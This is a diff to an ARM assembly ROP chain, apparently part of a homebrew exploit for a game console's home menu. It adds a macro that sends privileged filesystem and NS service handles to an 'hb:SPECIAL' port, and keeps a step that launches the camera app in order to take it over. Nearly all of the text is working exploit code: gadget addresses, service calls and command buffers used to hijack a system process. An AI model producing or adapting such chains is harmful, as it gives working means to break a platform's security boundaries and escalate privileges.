@@ -131,7 +131,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 	.word 0x001575ac ; pop {r0, pc}
 		.word src ; r0
 	.word 0x0013744c ; ldr r0, [r0] ; pop {r4, pc}
-		.word dst ; r1
+		.word dst ; r4
 	.word 0x001f3c30 ; str r0, [r4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
@@ -142,6 +142,18 @@ SNS_CODE_OFFSET equ 0x0001D300
 	.word 0x00214988 ; pop {r1, pc}
 		.word (0x80-0x5C) / 4 ; r1
 	.word 0x001e58e0 ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro hb_sendhandle,base,handle_ptr
+	transfer_word (MENU_OBJECT_LOC + base + sendFsCommandHandle - sendFsCommand - object), handle_ptr
+	get_cmdbuf
+	memcpy_r0_lr (MENU_OBJECT_LOC + base - object), (sendFsCommand_end - sendFsCommand)
+	.word 0x001575ac ; pop {r0, pc}
+		.word (MENU_OBJECT_LOC + hbspecialHandle - object) ; r0 (hb handle)
+	.word 0x00101c74 ; pop {r4, pc}
+		.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
+	.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
@@ -171,15 +183,8 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 		; send fs handle to hb:SPECIAL
 			connect_to_port (MENU_OBJECT_LOC + hbspecialHandle - object), (MENU_OBJECT_LOC + hbspecialString - object)
-			transfer_word (MENU_OBJECT_LOC + sendFsCommandHandle - object), MENU_FS_HANDLE
-			get_cmdbuf
-			memcpy_r0_lr (MENU_OBJECT_LOC + sendFsCommand - object), (sendFsCommand_end - sendFsCommand)
-			.word 0x001575ac ; pop {r0, pc}
-				.word (MENU_OBJECT_LOC + hbspecialHandle - object) ; r0 (hb handle)
-			.word 0x00101c74 ; pop {r4, pc}
-				.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
-  			.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
-				.word 0xDEADBABE ; r4 (garbage)
+			hb_sendhandle sendFsCommand, MENU_FS_HANDLE
+			hb_sendhandle sendNsCommand, MENU_NSS_HANDLE
 
 		; launch app that we want to takeover
 			nss_launch_title 0x00020400, 0x00040010 ; launch camera app
@@ -263,6 +268,16 @@ SNS_CODE_OFFSET equ 0x0001D300
 		sendFsCommandHandle:
 		.word 0x00000000 ; handle
 	sendFsCommand_end:
+
+	.align 0x4
+	sendNsCommand:
+		.word 0x000300C2 ; command header
+		.word 0x00000003 ; index (0 and 1 are reserved)
+		.word 0x733A736E  ; name (first half)
+		.word 0x00000000 ; name (second half)
+		.word 0x00000000 ; value 0
+		sendNsCommandHandle:
+		.word 0x00000000 ; handle
 
 	.align 0x20
 	snsCodeHook:
